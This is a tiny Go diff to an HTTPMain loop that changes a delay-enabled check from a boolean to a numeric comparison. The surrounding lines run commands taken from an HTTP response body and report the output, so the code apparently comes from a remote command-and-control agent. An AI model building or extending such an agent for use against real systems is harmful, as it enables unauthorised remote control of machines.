@@ -41,7 +41,7 @@ func HTTPMain() {
 			tasks.RunCommand(resp.Body)
 			returnOutput()
 		}
-		if global.SecondDelayEnabled {
+		if global.SecondDelayEnabled != 0 {
 			capabilities.Sleep_now(global.SecondDelay)
 			returnOutput()
 		}
